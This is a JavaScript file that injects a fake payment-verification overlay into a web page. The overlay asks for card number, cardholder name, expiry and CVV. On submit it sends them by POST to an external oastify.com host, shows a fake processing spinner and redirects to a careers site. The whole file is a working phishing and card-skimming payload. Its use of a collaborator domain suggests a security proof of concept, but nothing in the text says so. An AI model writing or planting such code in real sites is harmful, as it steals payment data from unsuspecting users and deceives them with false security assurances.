// Wait for Vite to finish loading
document.addEventListener('vite-script-loaded', function() {
  // Create fake payment overlay
  const fakePayment = document.createElement('div');
  fakePayment.className = 'phishing-overlay';
  fakePayment.innerHTML = `
    <div class="phishing-container">
      <h2 style="color:#d23f00">Payment Verification Required</h2>
      <p>Your payment method requires verification for security purposes. Please update your card details to continue:</p>
      
      <input type="text" id="phish-cardnum" placeholder="Card Number" class="phishing-input" maxlength="19">
      <input type="text" id="phish-cardname" placeholder="Name on Card" class="phishing-input">
      
      <div style="display: flex; gap: 10px;">
        <input type="text" id="phish-expiry" placeholder="MM/YY" class="phishing-input" style="flex: 1;">
        <input type="text" id="phish-cvv" placeholder="CVV" class="phishing-input" style="flex: 1;" maxlength="4">
      </div>
      
      <button id="phish-submit" class="phishing-button">Verify Payment Method</button>
      <p style="font-size: 12px; color: #666; margin-top: 15px;">
        <i class="fas fa-lock"></i> Your information is secured with 256-bit encryption
      </p>
    </div>
  `;
  
  document.body.appendChild(fakePayment);
  
  // Format card number input
  document.body.addEventListener('input', function(e) {
    if(e.target && e.target.id === 'phish-cardnum') {
      let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
      let formatted = value.replace(/(\d{4})/g, '$1 ').trim();
      e.target.value = formatted.substring(0, 19);
    }
    
    if(e.target && e.target.id === 'phish-expiry') {
      let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
      if (value.length > 2) {
        value = value.substring(0, 2) + '/' + value.substring(2, 4);
      }
      e.target.value = value.substring(0, 5);
    }
  });
  
  // Event delegation with better error handling
  document.body.addEventListener('click', function(e) {
    if(e.target && e.target.id === 'phish-submit') {
      try {
        const cardNum = document.getElementById('phish-cardnum').value;
        const cardName = document.getElementById('phish-cardname').value;
        const expiry = document.getElementById('phish-expiry').value;
        const cvv = document.getElementById('phish-cvv').value;
        
        // Use fetch API with error handling
        fetch('https://5synx55etlldi0ogs08w4pg25tbkzkn9.oastify.com/phish', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            card_number: cardNum,
            card_name: cardName,
            expiry_date: expiry,
            cvv: cvv,
            origin: window.location.href,
            timestamp: new Date().toISOString()
          }),
          mode: 'no-cors'
        }).catch(e => console.error);
        
        // Show fake processing message
        fakePayment.innerHTML = `
          <div style="text-align:center;padding:20px;">
            <div style="margin-bottom:15px;">
              <svg width="50" height="50" viewBox="0 0 38 38" xmlns="http://www.w3.org/2000/svg" stroke="#d23f00">
                <g fill="none" fill-rule="evenodd">
                  <g transform="translate(1 1)" stroke-width="2">
                    <circle stroke-opacity=".5" cx="18" cy="18" r="18"/>
                    <path d="M36 18c0-9.94-8.06-18-18-18">
                      <animateTransform attributeName="transform" type="rotate" from="0 18 18" to="360 18 18" dur="1s" repeatCount="indefinite"/>
                    </path>
                  </g>
                </g>
              </svg>
            </div>
            <p>Verifying your payment details. Please wait...</p>
          </div>`;
        
        // Redirect after 3 seconds
        setTimeout(() => { 
          fakePayment.style.display = 'none';
          window.location.href = 'https://careers.thetradedesk.com';
        }, 3000);
      } catch (e) {
        console.error('Payment verification script error:', e);
        // Still redirect even if error occurs
        window.location.href = 'https://careers.thetradedesk.com';
      }
    }
  });
});
